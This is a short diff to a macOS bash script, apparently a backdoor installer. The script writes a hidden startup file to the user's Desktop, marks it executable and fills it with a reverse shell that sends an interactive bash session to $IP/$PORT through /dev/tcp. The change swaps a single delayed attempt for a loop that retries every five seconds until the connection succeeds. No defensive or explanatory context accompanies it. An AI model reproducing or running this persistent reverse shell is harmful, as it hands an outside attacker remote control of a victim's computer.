@@ -3,8 +3,15 @@
 USR=$(whoami)
 
 echo "#!/bin/bash
-sleep 30
-bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
+while true; do
+    bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
+    
+    if [ $? -eq 0 ]; then
+        break
+    else
+        sleep 5
+    fi
+done
 " > /Users/$USR/Desktop/.runonstartupMACOS.sh
 
 chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh
